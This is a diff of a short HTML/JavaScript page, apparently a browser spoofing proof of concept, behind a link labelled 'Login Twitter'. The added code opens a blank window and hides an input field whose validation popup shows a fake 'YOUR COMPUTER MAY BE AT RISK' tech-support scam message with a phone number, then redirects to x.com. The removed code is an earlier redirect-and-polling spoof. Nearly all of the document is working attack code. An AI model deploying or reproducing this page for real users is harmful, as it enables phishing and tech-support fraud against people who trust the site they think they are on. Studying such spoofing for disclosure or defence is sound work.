@@ -1,14 +1,39 @@
 <script>
-    function next() {
-           w.location.replace('https://www.google.com:1234');
-          }
-  
-    function f() {
-      w = window.open("");
-      w.document.write('<h2>This is not x.com!</h2>');
-      w.location = "https://x.com";
-      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-    }
-  </script>
-  
-  <a href="#" onclick="f()">Login Twitter</a>
+let w;
+
+function f(e){
+    e.preventDefault();
+
+    w = window.open("about:blank","_blank");
+
+    w.document.open();
+    w.document.write(`
+<html>
+<body>
+
+<h2>Loading X...</h2>
+
+<input id="aaa" required>
+
+<script>
+var aaa = document.getElementById("aaa");
+aaa.style.opacity = "0";
+
+aaa.oninvalid = function(e){
+    e.target.setCustomValidity("WARNING!\\\\nYOUR COMPUTER MAY BE AT RISK.\\\\nCALL: 800-111-2222");
+};
+
+setTimeout(function(){
+    location.href = "https://x.com";
+},2000);
+
+<\/script>
+
+</body>
+</html>
+`);
+    w.document.close();
+}
+</script>
+
+<a href="#" onclick="f(event)">Login Twitter</a>
